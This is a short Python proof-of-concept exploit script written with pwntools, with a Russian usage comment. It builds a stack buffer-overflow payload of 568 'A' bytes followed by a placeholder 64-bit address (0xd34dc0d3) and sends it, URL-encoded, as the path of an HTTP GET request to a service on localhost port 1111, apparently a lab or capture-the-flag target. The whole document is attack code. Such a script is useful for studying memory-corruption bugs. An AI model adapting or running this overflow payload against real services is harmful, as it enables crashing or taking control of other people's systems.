#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Использование: python3 poc.py [DEBUG]

from pwn import *
from urllib.parse import quote as url_encode

context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64

payload = b''
payload += b'A' * 568
payload += p64(0xd34dc0d3)

r = remote('localhost', 1111)
r.sendline(f'GET /{url_encode(payload)}')
r.sendline()
